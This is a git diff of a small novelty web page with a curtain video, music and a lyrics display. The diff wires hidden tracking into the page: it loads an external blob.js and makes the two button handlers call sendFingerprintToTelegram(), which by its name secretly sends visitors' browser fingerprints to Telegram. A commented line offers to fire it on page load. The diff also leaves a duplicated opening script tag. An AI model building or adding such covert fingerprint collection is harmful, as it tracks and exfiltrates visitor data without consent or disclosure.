@@ -111,6 +111,7 @@
           box-shadow: 0 0 10px #ff0, inset 0 0 10px rgba(255, 255, 0, 0.2);
         }
     </style>
+    <script src="blob.js"></script> 
 </head>
 <body>
      <h1>Simple Js!</h1>
@@ -129,43 +130,18 @@
      <audio id="mu1" src="music.mp4"></audio>
 </body>
 <script>
+<script>
 // Your existing functions
 Vidd = document.getElementById("curtain");
 music = document.getElementById("mu1");
 abt = document.getElementById("abatu");
-
-// Create a queue for fingerprint requests
-let fingerprintQueue = [];
-let fingerprintReady = false;
-
-// Function to queue or send fingerprint
-function queueFingerprint() {
-    if (fingerprintReady) {
-        sendFingerprintToTelegram();
-    } else {
-        fingerprintQueue.push(true);
-    }
-}
-
-// Check when blob.js loads
-const scriptCheck = setInterval(() => {
-    if (typeof sendFingerprintToTelegram === 'function') {
-        fingerprintReady = true;
-        clearInterval(scriptCheck);
-        // Send any queued fingerprints
-        while(fingerprintQueue.length) {
-            fingerprintQueue.pop();
-            sendFingerprintToTelegram();
-        }
-    }
-}, 50);
 
 function opp(){
     console.log("success");
     Vidd.src = "curtain.mp4";
     Vidd.load();
     Vidd.play(); 
-    queueFingerprint();
+    sendFingerprintToTelegram();  // 👈 Call it here
 }
 
 function cloo(){
@@ -176,7 +152,7 @@ function cloo(){
     music.play();
     abt.style.opacity = "1";
     abt.style.opacityDuration = "2s";
-    queueFingerprint();
+    sendFingerprintToTelegram();  // 👈 Call it here
 }
 
 function printLyrics() {
@@ -212,6 +188,8 @@ function printLyrics() {
     
     return displayLyrics();
 }
+
+// 👇 Or call it automatically when page loads
+// sendFingerprintToTelegram();
 </script>
-<script defer src="blob.js"></script>
 </html>
